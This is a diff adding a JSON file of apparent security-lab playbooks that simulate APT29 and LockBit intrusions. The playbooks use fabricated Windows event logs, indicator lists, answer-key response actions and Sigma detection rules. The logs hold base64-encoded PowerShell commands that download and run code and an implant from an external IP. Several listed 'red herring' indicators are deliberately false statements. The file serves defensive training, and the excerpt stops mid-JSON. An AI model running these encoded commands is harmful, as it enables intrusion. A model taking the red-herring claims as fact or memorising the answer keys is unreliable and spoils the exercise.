@@ -1,0 +1,1340 @@
+{
+  "schema_version": "1.0",
+  "source": "PWNDORA BASLab",
+  "response_actions": [
+    "Isolate Host",
+    "Block IP/Domain",
+    "Kill Process",
+    "Revoke Credentials",
+    "Alert SOC Only",
+    "Quarantine File",
+    "No Action Required"
+  ],
+  "playbooks": [
+    {
+      "playbook_id": "pb-apt29-midnight-strike",
+      "name": "Operation Midnight Strike",
+      "threat_actor": "APT29",
+      "difficulty": "Hard",
+      "description": "A state-sponsored intrusion beginning with a macro-enabled invoice document delivered to the finance team. The operator pivots from Office to encoded PowerShell, injects into a trusted host process, dumps LSASS for credential material, and reuses harvested domain administrator hashes to move laterally over SMB administrative shares.",
+      "techniques": [
+        {
+          "technique_id": "T1566.001",
+          "technique_name": "Spearphishing Attachment",
+          "tactic": "Initial Access",
+          "description": "A finance analyst opens a macro-enabled invoice attachment delivered by email. The document's VBA project spawns a hidden, base64-encoded PowerShell stager from WINWORD.EXE.",
+          "log_evidence": [
+            {
+              "channel": "Security",
+              "event_id": 4688,
+              "timestamp": "2026-07-24T09:14:02.418Z",
+              "computer": "WS-FINANCE-04.corp.internal",
+              "fields": {
+                "SubjectUserSid": "S-1-5-21-1194762330-4021884723-1907732297-1841",
+                "SubjectUserName": "jdoe",
+                "SubjectDomainName": "CORP",
+                "SubjectLogonId": "0x4a91c",
+                "NewProcessId": "0x1a24",
+                "NewProcessName": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "TokenElevationType": "%%1936",
+                "ProcessId": "0x0f18",
+                "ParentProcessName": "C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+                "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AYQAuAHAAcwAxACcAKQA=",
+                "MandatoryLabel": "S-1-16-8192"
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 1,
+              "timestamp": "2026-07-24T09:14:02.421Z",
+              "computer": "WS-FINANCE-04.corp.internal",
+              "fields": {
+                "RuleName": "ProcessCreate::office-child-process",
+                "UtcTime": "2026-07-24 09:14:02.421",
+                "ProcessGuid": "{6f1a2b3c-9d41-6892-2f01-000000000900}",
+                "ProcessId": "6692",
+                "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "OriginalFileName": "PowerShell.EXE",
+                "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AYQAuAHAAcwAxACcAKQA=",
+                "CurrentDirectory": "C:\\Users\\jdoe\\Documents\\",
+                "User": "CORP\\jdoe",
+                "LogonId": "0x4a91c",
+                "IntegrityLevel": "Medium",
+                "Hashes": "SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F",
+                "ParentProcessGuid": "{6f1a2b3c-9d0e-6892-1a00-000000000900}",
+                "ParentImage": "C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+                "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jdoe\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\9F2K1LMN\\Q3_Vendor_Invoice.docm\""
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 11,
+              "timestamp": "2026-07-24T09:13:58.902Z",
+              "computer": "WS-FINANCE-04.corp.internal",
+              "fields": {
+                "UtcTime": "2026-07-24 09:13:58.902",
+                "ProcessId": "3864",
+                "Image": "C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+                "TargetFilename": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\~WRD0001.tmp",
+                "CreationUtcTime": "2026-07-24 09:13:58.902",
+                "User": "CORP\\jdoe"
+              }
+            }
+          ],
+          "reference_indicators": [
+            "ParentImage ends with 'WINWORD.EXE'",
+            "CommandLine contains '-Enc' (base64-encoded payload)",
+            "CommandLine contains '-W Hidden' (suppressed window)",
+            "Security EID 4688 NewProcessName: powershell.exe spawned by an Office application",
+            "ParentCommandLine references a .docm opened from the Outlook Content.Outlook cache"
+          ],
+          "red_herring_indicators": [
+            "IntegrityLevel: Medium (process is running elevated)",
+            "TokenElevationType: %%1936 (full administrator token)",
+            "Sysmon EID 11 TargetFilename: ~WRD0001.tmp (Word autosave artifact)",
+            "CurrentDirectory: C:\\Users\\jdoe\\Documents\\ (unusual working directory)"
+          ],
+          "correct_response_action": "Isolate Host",
+          "sigma_rule_yaml": "title: Detect Office Application Spawning Encoded PowerShell\nid: 67cd2477-6f8b-49a5-ab26-03f5b4dd7ad4\nstatus: experimental\ndescription: Detects a Microsoft Office application spawning PowerShell with an encoded command line, a common spearphishing attachment execution chain.\nreferences:\n  - https://attack.mitre.org/techniques/T1566/001/\nauthor: BlackPerl DFIR\ndate: 2026/07/25\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_parent:\n    ParentImage|endswith:\n      - '\\WINWORD.EXE'\n      - '\\EXCEL.EXE'\n      - '\\POWERPNT.EXE'\n      - '\\OUTLOOK.EXE'\n  selection_child:\n    Image|endswith: '\\powershell.exe'\n  selection_flags:\n    CommandLine|contains:\n      - ' -Enc'\n      - ' -EncodedCommand'\n      - ' -W Hidden'\n      - ' -WindowStyle Hidden'\n  filter_legitimate:\n    CommandLine|contains: '\\Program Files\\Microsoft Office\\Updates\\'\n  condition: selection_parent and selection_child and selection_flags and not filter_legitimate\nfalsepositives:\n  - Office add-in deployment scripts executed by IT automation\nlevel: high\ntags:\n  - attack.initial_access\n  - attack.t1566.001\n  - attack.execution\n  - attack.t1059.001\n"
+        },
+        {
+          "technique_id": "T1059.001",
+          "technique_name": "PowerShell",
+          "tactic": "Execution",
+          "description": "The stager relaunches PowerShell with execution policy bypassed and a second encoded payload that pulls the implant from the operator's staging host over HTTP.",
+          "log_evidence": [
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 1,
+              "timestamp": "2026-07-24T09:14:05.774Z",
+              "computer": "WS-FINANCE-04.corp.internal",
+              "fields": {
+                "RuleName": "ProcessCreate::script-host-launch",
+                "UtcTime": "2026-07-24 09:14:05.774",
+                "ProcessGuid": "{6f1a2b3c-9d45-6892-3001-000000000900}",
+                "ProcessId": "7104",
+                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "OriginalFileName": "PowerShell.EXE",
+                "CommandLine": "powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AaQBtAHAAbABhAG4AdAAuAGIAaQBuACAALQBPAHUAdABGAGkAbABlACAAJABlAG4AdgA6AFQARQBNAFAAXABtAHMAYwBvAHIAZQBlADMAMgAuAGQAbABsAA==",
+                "CurrentDirectory": "C:\\Users\\jdoe\\Documents\\",
+                "User": "CORP\\jdoe",
+                "LogonId": "0x4a91c",
+                "IntegrityLevel": "Medium",
+                "ParentImage": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "ParentCommandLine": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+              }
+            },
+            {
+              "channel": "Security",
+              "event_id": 4688,
+              "timestamp": "2026-07-24T09:14:05.771Z",
+              "computer": "WS-FINANCE-04.corp.internal",
+              "fields": {
+                "SubjectUserName": "jdoe",
+                "SubjectDomainName": "CORP",
+                "SubjectLogonId": "0x4a91c",
+                "NewProcessId": "0x1bc0",
+                "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "ParentProcessName": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "CommandLine": "powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AaQBtAHAAbABhAG4AdAAuAGIAaQBuAA==",
+                "TokenElevationType": "%%1938",
+                "MandatoryLabel": "S-1-16-8192"
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 3,
+              "timestamp": "2026-07-24T09:14:06.310Z",
+              "computer": "WS-FINANCE-04.corp.internal",
+              "fields": {
+                "UtcTime": "2026-07-24 09:14:06.310",
+                "ProcessId": "7104",
+                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "User": "CORP\\jdoe",
+                "Protocol": "tcp",
+                "Initiated": "true",
+                "SourceIp": "10.10.10.88",
+                "SourcePort": "51422",
+                "DestinationIp": "185.220.101.47",
+                "DestinationPort": "80",
+                "DestinationHostname": "-"
+              }
+            }
+          ],
+          "reference_indicators": [
+            "CommandLine contains '-ExecutionPolicy Bypass'",
+            "CommandLine contains '-enc' (base64-encoded command)",
+            "CommandLine contains '-NoProfile'",
+            "Decoded payload contains 'Invoke-WebRequest' to an external host",
+            "Sysmon EID 3 powershell.exe initiated an outbound connection to 185.220.101.47"
+          ],
+          "red_herring_indicators": [
+            "SubjectLogonId: 0x4a91c (SYSTEM logon session)",
+            "DestinationPort: 80 (standard web traffic, no action needed)",
+            "OriginalFileName: PowerShell.EXE (renamed binary detected)",
+            "TokenElevationType: %%1938 (limited token indicates UAC bypass)"
+          ],
+          "correct_response_action": "Kill Process",
+          "sigma_rule_yaml": "title: Detect PowerShell Execution Policy Bypass With Encoded Command\nid: 8abe0c64-31a8-4b0b-8783-8a75a51aaa81\nstatus: experimental\ndescription: Detects PowerShell invoked with both an execution policy bypass and a base64 encoded command, a hallmark of staged implant delivery.\nreferences:\n  - https://attack.mitre.org/techniques/T1059/001/\nauthor: BlackPerl DFIR\ndate: 2026/07/25\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_image:\n    Image|endswith:\n      - '\\powershell.exe'\n      - '\\pwsh.exe'\n  selection_bypass:\n    CommandLine|contains:\n      - '-ExecutionPolicy Bypass'\n      - '-ep bypass'\n      - '-exec bypass'\n  selection_encoded:\n    CommandLine|contains:\n      - ' -enc '\n      - ' -EncodedCommand '\n      - ' -e JAB'\n  filter_sccm:\n    ParentImage|endswith: '\\CcmExec.exe'\n  condition: selection_image and selection_bypass and selection_encoded and not filter_sccm\nfalsepositives:\n  - Software distribution platforms that wrap encoded install scripts\nlevel: high\ntags:\n  - attack.execution\n  - attack.t1059.001\n"
+        },
+        {
+          "technique_id": "T1055.001",
+          "technique_name": "Dynamic-link Library Injection",
+          "tactic": "Defense Evasion",
+          "description": "The implant is written to disk as a DLL, mapped into the user's explorer.exe session, and executed via a remote thread so that subsequent activity originates from a trusted, signed process.",
+          "log_evidence": [
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 8,
+              "timestamp": "2026-07-24T09:15:44.108Z",
+              "computer": "WS-FINANCE-04.corp.internal",
+              "fields": {
+                "RuleName": "CreateRemoteThread::cross-process-thread",
+                "UtcTime": "2026-07-24 09:15:44.108",
+                "SourceProcessGuid": "{6f1a2b3c-9d45-6892-3001-000000000900}",
+                "SourceProcessId": "7104",
+                "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "TargetProcessId": "4128",
+                "TargetImage": "C:\\Windows\\System32\\explorer.exe",
+                "NewThreadId": "4820",
+                "StartAddress": "0x7ffb3a210000",
+                "StartModule": "-",
+                "StartFunction": "-"
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 10,
+              "timestamp": "2026-07-24T09:15:44.061Z",
+              "computer": "WS-FINANCE-04.corp.internal",
+              "fields": {
+                "UtcTime": "2026-07-24 09:15:44.061",
+                "SourceProcessId": "7104",
+                "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "TargetProcessId": "4128",
+                "TargetImage": "C:\\Windows\\System32\\explorer.exe",
+                "GrantedAccess": "0x1fffff",
+                "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d234|C:\\Windows\\System32\\KERNELBASE.dll+38a3e|UNKNOWN(00007FFB3A210000)",
+                "SourceUser": "CORP\\jdoe",
+                "TargetUser": "CORP\\jdoe"
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 7,
+              "timestamp": "2026-07-24T09:15:44.230Z",
+              "computer": "WS-FINANCE-04.corp.internal",
+              "fields": {
+                "UtcTime": "2026-07-24 09:15:44.230",
+                "ProcessId": "4128",
+                "Image": "C:\\Windows\\System32\\explorer.exe",
+                "ImageLoaded": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\mscoree32.dll",
+                "Signed": "false",
+                "Signature": "-",
+                "SignatureStatus": "Unavailable",
+                "Hashes": "SHA256=3B1D2C4F7A0E5B9C8D6F1A2E3C4B5D6E7F8091A2B3C4D5E6F70819A2B3C4D5E6"
+              }
+            }
+          ],
+          "reference_indicators": [
+            "Sysmon EID 8 CreateRemoteThread SourceImage: powershell.exe",
+            "Sysmon EID 8 TargetImage: explorer.exe",
+            "Sysmon EID 10 GrantedAccess: 0x1fffff (PROCESS_ALL_ACCESS)",
+            "StartAddress 0x7ffb3a210000 has no backing module (StartModule is empty)",
+            "Sysmon EID 7 unsigned DLL loaded from AppData\\Local\\Temp"
+          ],
+          "red_herring_indicators": [
+            "Sysmon EID 8 NewThreadId: 4820 (thread identifier outside the valid range)",
+            "TargetImage explorer.exe is a signed Microsoft binary",
+            "CallTrace begins in ntdll.dll (kernel transition, always malicious)",
+            "SourceUser and TargetUser are identical (privilege escalation confirmed)"
+          ],
+          "correct_response_action": "Kill Process",
+          "sigma_rule_yaml": "title: Detect Remote Thread Injection Into Explorer From Script Host\nid: 257d6b2e-3c73-430f-9b7f-fecf8c1ce7ad\nstatus: experimental\ndescription: Detects a scripting host creating a remote thread in a trusted shell process with full access rights, indicating DLL or shellcode injection.\nreferences:\n  - https://attack.mitre.org/techniques/T1055/001/\nauthor: BlackPerl DFIR\ndate: 2026/07/25\nlogsource:\n  category: create_remote_thread\n  product: windows\ndetection:\n  selection:\n    SourceImage|endswith:\n      - '\\powershell.exe'\n      - '\\pwsh.exe'\n      - '\\wscript.exe'\n      - '\\cscript.exe'\n      - '\\mshta.exe'\n    TargetImage|endswith:\n      - '\\explorer.exe'\n      - '\\svchost.exe'\n      - '\\dllhost.exe'\n  filter_known_module:\n    StartModule|contains: 'C:\\Windows\\System32\\'\n  condition: selection and not filter_known_module\nfalsepositives:\n  - Endpoint agents performing in-memory instrumentation\nlevel: high\ntags:\n  - attack.defense_evasion\n  - attack.privilege_escalation\n  - attack.t1055.001\n"
+        },
+        {
+          "technique_id": "T1003.001",
+          "technique_name": "LSASS Memory",
+          "tactic": "Credential Access",
+          "description": "Running inside explorer.exe, the implant opens a handle to LSASS with read and query rights and writes a process minidump to the user temp directory for offline credential extraction.",
+          "log_evidence": [
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 10,
+              "timestamp": "2026-07-24T09:21:17.556Z",
+              "computer": "WS-FINANCE-04.corp.internal",
+              "fields": {
+                "RuleName": "ProcessAccess::protected-process-handle",
+                "UtcTime": "2026-07-24 09:21:17.556",
+                "SourceProcessId": "4128",
+                "SourceImage": "C:\\Windows\\System32\\explorer.exe",
+                "TargetProcessId": "744",
+                "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+                "GrantedAccess": "0x1010",
+                "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d234|C:\\Windows\\System32\\KERNELBASE.dll+38a3e|UNKNOWN(00007FFB3A210000)|C:\\Windows\\System32\\KERNEL32.DLL+17344",
+                "SourceUser": "CORP\\jdoe",
+                "TargetUser": "NT AUTHORITY\\SYSTEM"
+              }
+            },
+            {
+              "channel": "Security",
+              "event_id": 4656,
+              "timestamp": "2026-07-24T09:21:17.559Z",
+              "computer": "WS-FINANCE-04.corp.internal",
+              "fields": {
+                "SubjectUserSid": "S-1-5-21-1194762330-4021884723-1907732297-2207",
+                "SubjectUserName": "svc_backup",
+                "SubjectDomainName": "corp",
+                "SubjectLogonId": "0x4a91c",
+                "ObjectServer": "Security",
+                "ObjectType": "Process",
+                "ObjectName": "\\Device\\HarddiskVolume3\\Windows\\System32\\lsass.exe",
+                "HandleId": "0x2f18",
+                "AccessMask": "0x1010",
+                "AccessList": "%%4484 %%4490",
+                "ProcessName": "C:\\Windows\\System32\\explorer.exe"
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 11,
+              "timestamp": "2026-07-24T09:21:19.884Z",
+              "computer": "WS-FINANCE-04.corp.internal",
+              "fields": {
+                "UtcTime": "2026-07-24 09:21:19.884",
+                "ProcessId": "4128",
+                "Image": "C:\\Windows\\System32\\explorer.exe",
+                "TargetFilename": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\lsass.dmp",
+                "CreationUtcTime": "2026-07-24 09:21:19.884",
+                "User": "CORP\\jdoe"
+              }
+            }
+          ],
+          "reference_indicators": [
+            "Sysmon EID 10 TargetImage: lsass.exe",
+            "Sysmon EID 10 GrantedAccess: 0x1010",
+            "CallTrace contains UNKNOWN unbacked memory region",
+            "Security EID 4656 AccessMask: 0x1010 against lsass.exe",
+            "Sysmon EID 11 TargetFilename: lsass.dmp written to AppData\\Local\\Temp"
+          ],
+          "red_herring_indicators": [
+            "SubjectUserName: svc_backup (backup service accounts may read process memory)",
+            "TargetUser: NT AUTHORITY\\SYSTEM (LSASS always runs as SYSTEM)",
+            "ObjectServer: Security (audit subsystem, benign)",
+            "SourceImage: explorer.exe is a signed Microsoft shell binary"
+          ],
+          "correct_response_action": "Revoke Credentials",
+          "sigma_rule_yaml": "title: Detect LSASS Memory Access via Process Access\nid: fa46aa29-eaef-466e-9f81-65b1c0c5bb28\nstatus: experimental\ndescription: Detects suspicious access to LSASS process memory indicating credential dumping.\nreferences:\n  - https://attack.mitre.org/techniques/T1003/001/\nauthor: BlackPerl DFIR\ndate: 2026/07/25\nlogsource:\n  category: process_access\n  product: windows\ndetection:\n  selection:\n    TargetImage|endswith: '\\lsass.exe'\n    GrantedAccess|contains:\n      - '0x1010'\n      - '0x1fffff'\n      - '0x1f3fff'\n      - '0x143a'\n  filter_legitimate:\n    SourceImage|contains:\n      - 'MsMpEng.exe'\n      - 'svchost.exe'\n      - 'wmiprvse.exe'\n  condition: selection and not filter_legitimate\nfalsepositives:\n  - Security software performing memory scanning\n  - Enterprise backup agents with debug privilege\nlevel: high\ntags:\n  - attack.credential_access\n  - attack.t1003.001\n"
+        },
+        {
+          "technique_id": "T1078",
+          "technique_name": "Valid Accounts",
+          "tactic": "Lateral Movement",
+          "description": "Hashes recovered from the LSASS dump are replayed against the domain controller. A domain administrator authenticates over the network with NTLM from the compromised finance workstation, followed by an RC4-encrypted Kerberos ticket request.",
+          "log_evidence": [
+            {
+              "channel": "Security",
+              "event_id": 4624,
+              "timestamp": "2026-07-24T09:33:41.207Z",
+              "computer": "DC-CORP-01.corp.internal",
+              "fields": {
+                "SubjectUserSid": "S-1-0-0",
+                "TargetUserName": "CORP\\domain_admin",
+                "TargetDomainName": "CORP",
+                "TargetLogonId": "0x91af22",
+                "LogonType": "3",
+                "LogonProcessName": "NtLmSsp",
+                "AuthenticationPackageName": "NTLM",
+                "WorkstationName": "WS-FINANCE-04",
+                "LmPackageName": "NTLM V2",
+                "KeyLength": "128",
+                "IpAddress": "10.10.10.88",
+                "IpPort": "51993",
+                "ImpersonationLevel": "%%1833"
+              }
+            },
+            {
+              "channel": "Security",
+              "event_id": 4769,
+              "timestamp": "2026-07-24T09:33:52.640Z",
+              "computer": "DC-CORP-01.corp.internal",
+              "fields": {
+                "TargetUserName": "domain_admin@CORP.INTERNAL",
+                "TargetDomainName": "CORP.INTERNAL",
+                "ServiceName": "krbtgt",
+                "ServiceSid": "S-1-5-21-1194762330-4021884723-1907732297-502",
+                "TicketOptions": "0x40810000",
+                "TicketEncryptionType": "0x17",
+                "ClientAddress": "::ffff:10.10.10.88",
+                "ClientPort": "52011",
+                "Status": "0x0"
+              }
+            },
+            {
+              "channel": "Security",
+              "event_id": 4672,
+              "timestamp": "2026-07-24T09:33:41.211Z",
+              "computer": "DC-CORP-01.corp.internal",
+              "fields": {
+                "SubjectUserName": "domain_admin",
+                "SubjectDomainName": "CORP",
+                "SubjectLogonId": "0x91af22",
+                "PrivilegeList": "SeSecurityPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeDebugPrivilege SeImpersonatePrivilege"
+              }
+            }
+          ],
+          "reference_indicators": [
+            "Security EID 4624 LogonType: 3 (network logon)",
+            "AuthenticationPackageName: NTLM used for a domain administrator logon",
+            "TargetUserName: CORP\\domain_admin authenticating from a finance workstation",
+            "Security EID 4769 TicketEncryptionType: 0x17 (RC4-HMAC downgrade)",
+            "IpAddress: 10.10.10.88 matches the previously compromised host"
+          ],
+          "red_herring_indicators": [
+            "LogonProcessName: NtLmSsp (unrecognised logon provider)",
+            "Security EID 4769 ServiceName: krbtgt (unusual service principal)",
+            "KeyLength: 128 (weak session key negotiated)",
+            "Security EID 4672 SeBackupPrivilege assigned (backup operator activity)"
+          ],
+          "correct_response_action": "Revoke Credentials",
+          "sigma_rule_yaml": "title: Detect NTLM Network Logon For Privileged Account From Workstation\nid: 4a77c32f-63a4-4b1a-bd75-593e5b5c3a76\nstatus: experimental\ndescription: Detects a privileged domain account performing an NTLM network logon sourced from an end-user workstation, consistent with pass-the-hash lateral movement.\nreferences:\n  - https://attack.mitre.org/techniques/T1078/\nauthor: BlackPerl DFIR\ndate: 2026/07/25\nlogsource:\n  product: windows\n  service: security\ndetection:\n  selection:\n    EventID: 4624\n    LogonType: 3\n    AuthenticationPackageName: 'NTLM'\n    TargetUserName|contains:\n      - 'domain_admin'\n      - 'ent_admin'\n      - '_adm'\n  filter_workstation:\n    WorkstationName|startswith:\n      - 'SRV-'\n      - 'DC-'\n      - 'MGMT-'\n  condition: selection and not filter_workstation\nfalsepositives:\n  - Legacy applications that still negotiate NTLM for administrative tasks\nlevel: high\ntags:\n  - attack.lateral_movement\n  - attack.defense_evasion\n  - attack.t1078\n"
+        },
+        {
+          "technique_id": "T1021.002",
+          "technique_name": "SMB/Windows Admin Shares",
+          "tactic": "Lateral Movement",
+          "description": "With domain administrator context, the operator connects to the ADMIN$ share on a file server, drops a service binary, and registers it to obtain remote execution.",
+          "log_evidence": [
+            {
+              "channel": "Security",
+              "event_id": 5140,
+              "timestamp": "2026-07-24T09:38:12.905Z",
+              "computer": "FS-CORP-07.corp.internal",
+              "fields": {
+                "SubjectUserSid": "S-1-5-21-1194762330-4021884723-1907732297-500",
+                "SubjectUserName": "domain_admin",
+                "SubjectDomainName": "CORP",
+                "SubjectLogonId": "0x7c40e1",
+                "ObjectType": "File",
+                "IpAddress": "10.10.10.88",
+                "IpPort": "52440",
+                "ShareName": "\\\\*\\ADMIN$",
+                "ShareLocalPath": "C:\\Windows",
+                "AccessMask": "0x1"
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 3,
+              "timestamp": "2026-07-24T09:38:12.418Z",
+              "computer": "WS-FINANCE-04.corp.internal",
+              "fields": {
+                "UtcTime": "2026-07-24 09:38:12.418",
+                "ProcessId": "4128",
+                "Image": "C:\\Windows\\System32\\svchost.exe",
+                "User": "NT AUTHORITY\\SYSTEM",
+                "Protocol": "tcp",
+                "Initiated": "true",
+                "SourceIp": "10.10.10.88",
+                "SourcePort": "52440",
+                "DestinationIp": "10.10.10.92",
+                "DestinationPort": "445",
+                "DestinationHostname": "FS-CORP-07.corp.internal"
+              }
+            },
+            {
+              "channel": "Security",
+              "event_id": 7045,
+              "timestamp": "2026-07-24T09:38:19.774Z",
+              "computer": "FS-CORP-07.corp.internal",
+              "fields": {
+                "ServiceName": "PSEXESVC",
+                "ImagePath": "%SystemRoot%\\PSEXESVC.exe",
+                "ServiceType": "user mode service",
+                "StartType": "demand start",
+                "AccountName": "LocalSystem",
+                "SubjectUserName": "domain_admin"
+              }
+            }
+          ],
+          "reference_indicators": [
+            "Security EID 5140 ShareName: \\\\*\\ADMIN$ accessed remotely",
+            "Security EID 7045 new service installed: PSEXESVC",
+            "Sysmon EID 3 outbound TCP/445 initiated to 10.10.10.92",
+            "SubjectUserName: domain_admin originating from 10.10.10.88",
+            "Service ImagePath resolves to %SystemRoot%\\PSEXESVC.exe"
+          ],
+          "red_herring_indicators": [
+            "Sysmon EID 3 Image: svchost.exe (signed Microsoft service host)",
+            "ShareLocalPath: C:\\Windows (non-standard share target)",
+            "AccessMask: 0x1 (read access only, low risk)",
+            "AccountName: LocalSystem (service accounts always run as LocalSystem)"
+          ],
+          "correct_response_action": "Isolate Host",
+          "sigma_rule_yaml": "title: Detect Remote Service Installation Following Admin Share Access\nid: 0a07493c-7ca4-457b-b29a-7a7c745a9e0d\nstatus: experimental\ndescription: Detects installation of a remote execution service such as PSEXESVC, typically preceded by access to the ADMIN$ administrative share.\nreferences:\n  - https://attack.mitre.org/techniques/T1021/002/\nauthor: BlackPerl DFIR\ndate: 2026/07/25\nlogsource:\n  product: windows\n  service: system\ndetection:\n  selection_service:\n    EventID: 7045\n    ServiceName|contains:\n      - 'PSEXESVC'\n      - 'PAExec'\n      - 'RemCom'\n      - 'CSEXEC'\n  selection_path:\n    ImagePath|contains:\n      - '%SystemRoot%\\'\n      - 'C:\\Windows\\'\n      - 'ADMIN$'\n  filter_managed:\n    AccountName|contains: 'CORP\\svc_sccm'\n  condition: selection_service and selection_path and not filter_managed\nfalsepositives:\n  - Sanctioned administrative tooling that deploys PsExec for remote support\nlevel: high\ntags:\n  - attack.lateral_movement\n  - attack.t1021.002\n"
+        }
+      ]
+    },
+    {
+      "playbook_id": "pb-lockbit-killchain",
+      "name": "LockBit Ransomware Kill Chain",
+      "threat_actor": "LockBit 3.0",
+      "difficulty": "Moderate",
+      "description": "An affiliate exploits an internet-facing CMS plugin to gain code execution on a DMZ web server, establishes registry run-key persistence while disabling Defender, destroys shadow copies and recovery options, encrypts user data, and beacons the collected files to the affiliate's C2 infrastructure.",
+      "techniques": [
+        {
+          "technique_id": "T1190",
+          "technique_name": "Exploit Public-Facing Application",
+          "tactic": "Initial Access",
+          "description": "An unauthenticated file-upload flaw in a CMS admin AJAX endpoint is abused from a scripted client to write a PHP handler into the web root and trigger an outbound callback.",
+          "log_evidence": [
+            {
+              "channel": "Microsoft-IIS-Logging/Logs",
+              "event_id": 0,
+              "timestamp": "2026-07-24T02:41:09.000Z",
+              "computer": "WEB-DMZ-02.corp.internal",
+              "fields": {
+                "method": "POST",
+                "uri": "/wp-admin/admin-ajax.php?action=upload_file",
+                "status": "200",
+                "bytes": "4096",
+                "user_agent": "python-requests/2.28.0",
+                "src_ip": "203.0.113.45",
+                "cs_username": "-",
+                "time_taken": "812",
+                "s_port": "443"
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 11,
+              "timestamp": "2026-07-24T02:41:09.446Z",
+              "computer": "WEB-DMZ-02.corp.internal",
+              "fields": {
+                "UtcTime": "2026-07-24 02:41:09.446",
+                "ProcessId": "5012",
+                "Image": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+                "TargetFilename": "C:\\inetpub\\wwwroot\\wp-content\\uploads\\2026\\07\\update.php",
+                "CreationUtcTime": "2026-07-24 02:41:09.446",
+                "User": "IIS APPPOOL\\DefaultAppPool"
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 3,
+              "timestamp": "2026-07-24T02:41:11.902Z",
+              "computer": "WEB-DMZ-02.corp.internal",
+              "fields": {
+                "UtcTime": "2026-07-24 02:41:11.902",
+                "ProcessId": "5012",
+                "Image": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+                "User": "IIS APPPOOL\\DefaultAppPool",
+                "Protocol": "tcp",
+                "Initiated": "true",
+                "SourceIp": "10.20.30.15",
+                "SourcePort": "49722",
+                "DestinationIp": "203.0.113.45",
+                "DestinationPort": "443",
+                "DestinationHostname": "-"
+              }
+            }
+          ],
+          "reference_indicators": [
+            "HTTP POST to /wp-admin/admin-ajax.php?action=upload_file returned 200",
+            "user_agent: python-requests/2.28.0 (scripted client, not a browser)",
+            "Sysmon EID 3 w3wp.exe initiated an outbound connection to 203.0.113.45",
+            "Sysmon EID 11 new .php file written under C:\\inetpub\\wwwroot by w3wp.exe",
+            "Inbound request and outbound callback share the same external IP"
